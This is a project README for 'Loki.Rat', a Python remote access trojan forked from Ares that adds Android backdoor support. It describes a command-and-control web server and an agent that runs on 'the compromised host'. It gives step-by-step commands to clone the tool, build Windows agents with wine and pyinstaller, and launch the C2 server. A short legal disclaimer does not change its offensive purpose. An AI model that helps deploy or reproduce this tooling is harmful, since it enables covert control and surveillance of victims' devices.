# Loki.Rat :mouse:
     
    ||||||||||||||||||||||||||||||||||||||||||||00000000000|||||||||||||||||||||||||||||||||||||||||              (\
    ||||||||||||||||||||||||||||||||||||||||||||00000000000|||||||||||||||||||||||||||||||||||||||||               \\
    ||||||||||||||||||||||||||||||||||||||||||||00000000000|||||||||||||||||||||||||||||||||||||||||                ))
    ||||||||||||||||||||||||||||||||||||||||||||00000000000|||||||||||||||||||||||||||||||||||||||||               //
    ||||||||||||||||||||||||||||||||||||||||||||00000000000|||||||||||||||||||||||||||||||||||||||||        .-.   //  .-.
    ||||||||||||||||||||||||||||||||||||||||||||00000000000|||||||||||||||||||||||||||||||||||||||||       / 0 \-((=-/   \
    |||||||██▓        ▒█████      ██ ▄█▀    ██▓            ██▀███      ▄▄▄         ▄▄▄█████▓ |||||||       \      \\     /
    |||||||▓██▒       ▒██▒  ██▒    ██▄█▒    ▓██▒           ▓██ ▒ ██▒   ▒████▄       ▓  ██▒ ▓▒|||||||        '( ____))_ )'
    |||||||▒██░       ▒██░  ██▒   ▓███▄░    ▒██▒           ▓██ ░▄█ ▒   ▒██  ▀█▄     ▒ ▓██░ ▒░|||||||        .-'   //  '-.
    |||||||▒██░       ▒██   ██░   ▓██ █▄    ░██░           ▒██▀▀█▄     ░██▄▄▄▄██    ░ ▓██▓ ░ |||||||       /     ((      \
    |||||||░██████▒   ░ ████▓▒░   ▒██▒ █▄   ░██░    ██▓    ░██▓ ▒██▒    ▓█   ▓██▒     ▒██▒ ░ |||||||      |       *       |
    |||||||░ ▒░▓  ░   ░ ▒░▒░▒░    ▒ ▒▒ ▓▒   ░▓      ▒▓▒    ░ ▒▓ ░▒▓░    ▒▒   ▓▒█░     ▒ ░░   |||||||       \             /
    |||||||░ ░ ▒  ░     ░ ▒ ▒░    ░ ░▒ ▒░    ▒ ░    ░▒       ░▒ ░ ▒░     ▒   ▒▒ ░       ░    |||||||        \   |_w_|   /
    |||||||░ ░      ░ ░ ░ ▒     ░ ░░ ░     ▒ ░    ░        ░░   ░      ░   ▒        ░        |||||||        _)  \ ` /  (_
    |||||||░  ░       ░ ░     ░  ░       ░       ░        ░              ░  ░                |||||||      (((_ _/   \_ _)))
    |||||||░                                                                                 |||||||
    
Loki.Rat is a fork of the [Ares RAT](https://github.com/sweetsoftware/Ares), it integrates new modules, like the backdoor support for the android platform
Loki.Rat is a Python Remote Access Tool.

Warning: Only use this software according to your current legislation. Misuse of this software can raise legal and ethical issues which I don't support nor can be held responsible for.

Loki.Rat is made of two main programs:

    A Command aNd Control server, which is a Web interface to administer the agents
    An agent program, which is run on the compromised host, and ensures communication with the CNC

The Web interface can be run on any server running Python. The agent[Payload] can be compiled to native executables using pyinstaller.
# Setup 

Install The Loki.Rat 

Open a terminal windows and type this command :
 ```
     git clone https://github.com/TheGeekHT/Loki.Rat.git
     cd Loki.Rat
 ```
 Install the Python modules requirements:
 ```
     pip install -r requirements.txt
 ```
 Initialize the database:
 ```
     cd server
    ./ares.py initdb
 ```    
 In order to compile Windows agents on Linux, setup wine (optional):
 ```
     ./wine_setup.sh
 ```
 ## Server
 
 Run with the builtin (debug) server:
 ```
     ./ares.py runserver -h 1.0.1.0 -p 8080 --threaded
 ```
 Or run using gunicorn:
 ```
     gunicorn ares:app -b 1.0.1.0:8080 --threads 20
 ```
 The server should now be accessible on http://1.0.1.0:8080
 Made with :yellow_heart: in HAITI 🇭🇹 
